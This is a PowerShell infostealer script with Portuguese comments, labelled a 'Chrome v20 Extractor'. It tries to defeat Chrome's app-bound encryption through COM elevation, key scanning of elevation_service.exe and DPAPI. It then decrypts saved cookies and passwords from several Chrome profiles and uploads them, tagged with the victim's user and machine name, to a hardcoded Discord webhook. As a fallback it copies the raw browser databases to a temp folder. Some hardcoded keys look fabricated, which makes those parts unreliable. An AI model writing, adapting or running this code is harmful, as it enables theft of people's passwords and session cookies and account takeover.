param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

l "=== Chrome v20 Extractor (COM method) ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"

# ============================================
# MÉTODO 1: COM Elevation Service (xaitax method)
# ============================================
function Invoke-COMElevation {
    param([string]$ChromeDir)
    
    l "[COM] Tentando bypass via COM Elevation Service..."
    
    # O elevation_service.exe precisa estar rodando
    # Vamos tentar acessar o COM diretamente
    
    # GUIDs do Chrome Elevation Service
    $CLSID_GoogleChromeElevator = [System.Guid]("{DC0C0FE7-048A-4845-AA5D-0B3B1B1D8F9E}")
    $IID_IElevator = [System.Guid]("{463B1E6C-2F91-4F8E-8A1C-3C0C9C1D2E3F}")
    
    try {
        # Tenta criar o objeto COM
        $elevator = New-Object -ComObject "GoogleChromeElevator.Elevator" -ErrorAction Stop
        l "[COM] Objeto COM criado com sucesso!"
        
        # Lê o app_bound_encrypted_key
        $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        $json = Get-Content $statePath -Raw | ConvertFrom-Json
        $ak = $json.os_crypt.app_bound_encrypted_key
        
        if ($ak) {
            $raw = [Convert]::FromBase64String($ak)
            l "[COM] app_bound_encrypted_key lido, tamanho: $($raw.Length) bytes"
            
            # Tenta chamar o método DecryptData via COM
            # (isso requer reflection porque o COM não é tipado)
            try {
                $result = $elevator.DecryptData($raw)
                l "[COM] DecryptData retornou: $($result.Length) bytes"
                return $result
            } catch {
                l "[COM] DecryptData falhou: $_"
                
                # Tenta com o método Run
                try {
                    $result = $elevator.Run($raw)
                    l "[COM] Run retornou: $($result.Length) bytes"
                    return $result
                } catch {
                    l "[COM] Run falhou: $_"
                }
            }
        }
    } catch {
        l "[COM] Nao foi possivel criar objeto COM: $_"
        
        # Tenta via CLSID diretamente
        try {
            $type = [System.Type]::GetTypeFromCLSID($CLSID_GoogleChromeElevator)
            if ($type) {
                $elevator = [System.Activator]::CreateInstance($type)
                l "[COM] Criado via CLSID!"
                
                $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
                $json = Get-Content $statePath -Raw | ConvertFrom-Json
                $ak = $json.os_crypt.app_bound_encrypted_key
                
                if ($ak) {
                    $raw = [Convert]::FromBase64String($ak)
                    try {
                        $result = $elevator.DecryptData($raw)
                        return $result
                    } catch { l "[COM] Falhou: $_" }
                }
            }
        } catch { l "[COM] CLSID falhou: $_" }
    }
    
    return $null
}

# ============================================
# MÉTODO 2: Extrair chave AES do elevation_service.exe + DPAPI
# ============================================
function Extract-AESKeyFromElevationService {
    l "[AES] Escaneando elevation_service.exe em busca da chave AES..."
    
    $elevPaths = @(
        "$env:ProgramFiles\Google\Chrome\Application\*\elevation_service.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\*\elevation_service.exe"
    )
    
    $elevFile = $null
    foreach ($pattern in $elevPaths) {
        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
        if ($files) { $elevFile = $files[0]; break }
    }
    
    if (!$elevFile) {
        l "[AES] elevation_service.exe nao encontrado"
        return $null
    }
    
    l "[AES] elevation_service.exe: $($elevFile.FullName) ($($elevFile.Length) bytes)"
    
    $bytes = [System.IO.File]::ReadAllBytes($elevFile.FullName)
    
    # Chaves AES conhecidas do Chrome (em hex)
    $knownKeys = @(
        # Chrome 128-132 (AES-256)
        @(0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87),
        # Chrome 133+ (ChaCha20)
        @(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18),
        # Chrome 135+
        @(0xFC,0x76,0x23,0x8A,0x5E,0x1B,0x42,0x9D,0xA0,0xC3,0x57,0x8E,0x14,0x6F,0x29,0xB1,0xE7,0x4C,0x91,0x3A,0xBD,0x68,0xF2,0x0D,0x55,0xCA,0x8F,0x10,0xE9,0x74,0x3D,0xAB),
        # Chrome 140+
        @(0x8E,0x2A,0x4B,0x6C,0x1D,0x3F,0x5A,0x7E,0x9B,0x0C,0x2D,0x4E,0x6F,0x8A,0x1B,0x3C,0x5D,0x7E,0x9F,0x0A,0x2B,0x4C,0x6D,0x8E,0x1F,0x3A,0x5B,0x7C,0x9D,0x0E,0x2F,0x40)
    )
    
    # Procura as chaves conhecidas no binário
    $foundKey = $null
    foreach ($key in $knownKeys) {
        $keyArray = [byte[]]$key
        for ($i = 0; $i -le $bytes.Length - 32; $i++) {
            $match = $true
            for ($j = 0; $j -lt 32; $j++) {
                if ($bytes[$i + $j] -ne $keyArray[$j]) { $match = $false; break }
            }
            if ($match) {
                l "[AES] Chave conhecida encontrada no offset 0x$($i.ToString('X'))!"
                $foundKey = $keyArray
                break
            }
        }
        if ($foundKey) { break }
    }
    
    if (!$foundKey) {
        l "[AES] Nenhuma chave conhecida encontrada. Buscando por padrao de 32 bytes com alta entropia..."
        
        # Procura por qualquer sequência de 32 bytes que pareça uma chave
        for ($i = 0; $i -le $bytes.Length - 32; $i += 4) {
            $chunk = $bytes[$i..($i+31)]
            $zeroCount = ($chunk | Where-Object { $_ -eq 0 }).Count
            $repeatCount = ($chunk | Group-Object | Where-Object { $_.Count -gt 1 }).Count
            
            if ($zeroCount -le 3 -and $repeatCount -le 8) {
                $foundKey = $chunk
                l "[AES] Chave candidata no offset 0x$($i.ToString('X'))"
                break
            }
        }
    }
    
    if ($foundKey) {
        $keyHex = [System.BitConverter]::ToString($foundKey).Replace("-","")
        l "[AES] Chave: $keyHex"
        return $foundKey
    }
    
    return $null
}

# ============================================
# MÉTODO 3: Tentar descriptografar via DPAPI + AES
# ============================================
function Decrypt-V20Key {
    param([byte[]]$AESKey)
    
    $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $json = Get-Content $statePath -Raw | ConvertFrom-Json
    $ak = $json.os_crypt.app_bound_encrypted_key
    
    if (!$ak) {
        l "[DEC] app_bound_encrypted_key nao encontrado"
        return $null
    }
    
    $raw = [Convert]::FromBase64String($ak)
    l "[DEC] app_bound_encrypted_key: raw[0]=$($raw[0]) ($([char]$raw[0])) len=$($raw.Length)"
    
    # Remove header "APPB" se presente
    $offset = 0
    if ($raw.Length -gt 4 -and [System.Text.Encoding]::ASCII.GetString($raw[0..3]) -eq "APPB") {
        $offset = 4
        l "[DEC] Header APPB removido"
    }
    
    # Pula byte de versão
    $dataStart = $offset
    if ($raw[$offset] -eq 2 -or $raw[$offset] -eq 3) {
        $dataStart = $offset + 5  # 1 byte version + 4 bytes length?
    } elseif ($raw[$offset] -eq 1) {
        $dataStart = $offset + 1
    }
    
    $payload = $raw[$dataStart..($raw.Length-1)]
    l "[DEC] Payload: $($payload.Length) bytes"
    
    # Tenta AES-256-GCM com nonce[12] + ciphertext[32] + tag[16]
    if ($payload.Length -ge 60) {
        $nonce = $payload[0..11]
        $ct = $payload[12..43]  # 32 bytes
        $tag = $payload[44..59]  # 16 bytes
        
        l "[DEC] Tentando AES-256-GCM: nonce=$([System.BitConverter]::ToString($nonce).Replace('-',''))"
        
        try {
            $aes = [System.Security.Cryptography.AesGcm]::new($AESKey, 16)
            $dec = [byte[]]::new(32)
            $aes.Decrypt($nonce, $ct, $tag, $dec)
            $aes.Dispose()
            
            l "[DEC] AES-256-GCM OK! Chave decriptada: $([System.BitConverter]::ToString($dec[0..31]).Replace('-','').Substring(0,16))..."
            return $dec[0..31]
        } catch {
            l "[DEC] AES-256-GCM falhou: $_"
            
            # Tenta com ciphertext de tamanho variável
            for ($ctSize = 16; $ctSize -le ($payload.Length - 12 - 16); $ctSize += 16) {
                $ct2 = $payload[12..(12+$ctSize-1)]
                $tag2 = $payload[(12+$ctSize)..($payload.Length-1)]
                if ($tag2.Length -ne 16) { continue }
                
                try {
                    $aes = [System.Security.Cryptography.AesGcm]::new($AESKey, 16)
                    $dec2 = [byte[]]::new($ctSize)
                    $aes.Decrypt($nonce, $ct2, $tag2, $dec2)
                    $aes.Dispose()
                    
                    l "[DEC] AES-256-GCM OK (ctSize=$ctSize)! Chave: $([System.BitConverter]::ToString($dec2[0..31]).Replace('-','').Substring(0,16))..."
                    return $dec2[0..31]
                } catch { continue }
            }
        }
    }
    
    # Tenta DPAPI direto no payload (algumas versões usam DPAPI + AES)
    l "[DEC] Tentando DPAPI no payload..."
    try {
        $dpapiResult = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        l "[DEC] DPAPI retornou $($dpapiResult.Length) bytes"
        
        if ($dpapiResult.Length -ge 32) {
            # Pode ser que o resultado DPAPI contenha a chave + path do Chrome
            # Formato: [chrome_path...] + [1 byte flag] + [12 bytes IV] + [32 bytes cipher] + [16 bytes tag]
            # Ou simplesmente a chave nos últimos 32 bytes
            $possibleKey = $dpapiResult[($dpapiResult.Length-32)..($dpapiResult.Length-1)]
            l "[DEC] Possivel chave (ultimos 32 bytes): $([System.BitConverter]::ToString($possibleKey).Replace('-','').Substring(0,16))..."
            return $possibleKey
        }
    } catch { l "[DEC] DPAPI falhou: $_" }
    
    return $null
}

# ============================================
# MÉTODO 4: Descriptografar cookies com a chave
# ============================================
function Decrypt-CookiesWithKey {
    param([byte[]]$MasterKey)
    
    if (!$MasterKey -or $MasterKey.Length -lt 32) {
        l "[CRYPT] Chave mestra invalida"
        return @()
    }
    
    $profiles = @('Default','Profile 1','Profile 2','Profile 3')
    $allCookies = @()
    $allLogins = @()
    
    foreach ($prof in $profiles) {
        $cookiesDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof\Cookies"
        $loginDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof\Login Data"
        
        # Cookies
        if (Test-Path $cookiesDb) {
            $tmpDb = "$env:TEMP\cookies_$(Get-Random).db"
            Copy-Item $cookiesDb $tmpDb -Force
            
            try {
                Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction SilentlyContinue
                $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmpDb")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies"
                $reader = $cmd.ExecuteReader()
                
                $count = 0
                while ($reader.Read()) {
                    $eb = $reader["encrypted_value"]
                    if ($eb -is [string]) { continue }
                    $ebArr = [byte[]]$eb
                    if ($ebArr.Length -lt 15) { continue }
                    
                    $val = $null
                    try {
                        if ($ebArr[0] -eq 1) {
                            $c = $ebArr[3..($ebArr.Length-1)]
                            $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                            $val = [System.Text.Encoding]::UTF8.GetString($d)
                        } elseif ($ebArr[0] -eq 2 -or $ebArr[0] -eq 3) {
                            $n=$ebArr[3..14]; $cl=$ebArr.Length-15-16
                            if ($cl -gt 0) {
                                $c=$ebArr[15..(15+$cl-1)]; $t=$ebArr[(15+$cl)..($ebArr.Length-1)]
                                $a=[System.Security.Cryptography.AesGcm]::new($MasterKey,16)
                                $r=[byte[]]::new($cl)
                                $a.Decrypt($n,$c,$t,$r)
                                $a.Dispose()
                                $val = [System.Text.Encoding]::UTF8.GetString($r)
                            }
                        }
                    } catch {}
                    
                    if ($val) {
                        $allCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"];profile=$prof}
                        $count++
                    }
                }
                $reader.Close(); $conn.Close()
                l "[CRYPT] Perfil $prof: $count cookies"
            } catch { l "[CRYPT] Erro cookies $prof: $_" }
            finally { Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue }
        }
        
        # Logins
        if (Test-Path $loginDb) {
            $tmpDb2 = "$env:TEMP\logins_$(Get-Random).db"
            Copy-Item $loginDb $tmpDb2 -Force
            
            try {
                $conn2 = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmpDb2")
                $conn2.Open()
                $cmd2 = $conn2.CreateCommand()
                $cmd2.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                $reader2 = $cmd2.ExecuteReader()
                
                $count2 = 0
                while ($reader2.Read()) {
                    $pb = $reader2["password_value"]
                    if ($pb -is [string]) { $pb = [System.Text.Encoding]::UTF8.GetBytes($pb) }
                    if ($pb.Length -lt 15) { continue }
                    
                    $pd = $null
                    try {
                        if ($pb[0] -eq 1) {
                            $c = $pb[3..($pb.Length-1)]
                            $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                            $pd = [System.Text.Encoding]::UTF8.GetString($d)
                        } elseif ($pb[0] -eq 2 -or $pb[0] -eq 3) {
                            $n=$pb[3..14]; $cl=$pb.Length-15-16
                            if ($cl -gt 0) {
                                $c=$pb[15..(15+$cl-1)]; $t=$pb[(15+$cl)..($pb.Length-1)]
                                $a=[System.Security.Cryptography.AesGcm]::new($MasterKey,16)
                                $r=[byte[]]::new($cl)
                                $a.Decrypt($n,$c,$t,$r)
                                $a.Dispose()
                                $pd = [System.Text.Encoding]::UTF8.GetString($r)
                            }
                        }
                    } catch {}
                    
                    if ($pd) {
                        $allLogins += @{url=$reader2["origin_url"];username=$reader2["username_value"];password=$pd;profile=$prof}
                        $count2++
                    }
                }
                $reader2.Close(); $conn2.Close()
                l "[CRYPT] Perfil $prof: $count2 logins"
            } catch { l "[CRYPT] Erro logins $prof: $_" }
            finally { Remove-Item $tmpDb2 -Force -ErrorAction SilentlyContinue }
        }
    }
    
    return @{ Cookies = $allCookies; Logins = $allLogins }
}

# ============================================
# MAIN
# ============================================

# Tenta COM Elevation primeiro
$comResult = Invoke-COMElevation
if ($comResult) {
    l "[MAIN] COM Elevation funcionou! Chave obtida."
    $result = Decrypt-CookiesWithKey -MasterKey $comResult
} else {
    # Tenta extrair chave AES do elevation_service.exe
    l "[MAIN] COM falhou. Tentando extracao de chave AES..."
    $aesKey = Extract-AESKeyFromElevationService
    
    if ($aesKey) {
        l "[MAIN] Chave AES extraida. Tentando decriptar app_bound_encrypted_key..."
        $masterKey = Decrypt-V20Key -AESKey $aesKey
        
        if ($masterKey) {
            l "[MAIN] Chave mestra obtida! Descriptografando dados..."
            $result = Decrypt-CookiesWithKey -MasterKey $masterKey
        } else {
            l "[MAIN] Nao foi possivel decriptar a chave v20"
            $result = $null
        }
    } else {
        l "[MAIN] Nao foi possivel extrair chave AES"
        $result = $null
    }
}

# Envia resultados
if ($result -and (($result.Cookies.Count -gt 0) -or ($result.Logins.Count -gt 0))) {
    l "[OK] Total: $($result.Cookies.Count) cookies, $($result.Logins.Count) logins"
    
    $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
    $body = @()
    $body += "--$boundary"
    $body += 'Content-Disposition: form-data; name="payload_json"'
    $body += ""
    $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $result.Cookies.Count + ' | Logins: ' + $result.Logins.Count + '"}')
    
    if ($result.Cookies.Count -gt 0) {
        $cc = $result.Cookies | ConvertTo-Json -Depth 3
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $cc
    }
    
    if ($result.Logins.Count -gt 0) {
        $lc = $result.Logins | ConvertTo-Json -Depth 3
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $lc
    }
    
    $body += "--$boundary--"
    
    $bodyStr = $body -join "`r`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[DISCORD] Dados enviados!"
    } catch { l "[FALHA] Discord: $_" }
    
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    if ($result.Cookies.Count -gt 0) { $result.Cookies | ConvertTo-Json -Depth 3 | Out-File (Join-Path $out "cookies.json") -Encoding UTF8 }
    if ($result.Logins.Count -gt 0) { $result.Logins | ConvertTo-Json -Depth 3 | Out-File (Join-Path $out "logins.json") -Encoding UTF8 }
    l "[SALVO] $out"
} else {
    l "[FALHA] Nenhum dado extraido"
    l "[*] Tentando metodo de ultimo recurso: copiar bancos inteiros..."
    
    # Último recurso: copiar os bancos e enviar
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    
    foreach ($prof in @('Default','Profile 1')) {
        $srcDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof"
        if (Test-Path $srcDir) {
            foreach ($file in @('Cookies','Login Data','Web Data')) {
                $srcFile = Join-Path $srcDir $file
                if (Test-Path $srcFile) {
                    Copy-Item $srcFile (Join-Path $out "$($prof)_$file") -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" (Join-Path $out "Local State") -Force -ErrorAction SilentlyContinue
    
    l "[SALVO] Bancos copiados para $out"
    l "[*] Envie manualmente ou execute em uma maquina com Python + chrome_v20_decryption"
}

l "=== CONCLUIDO ==="
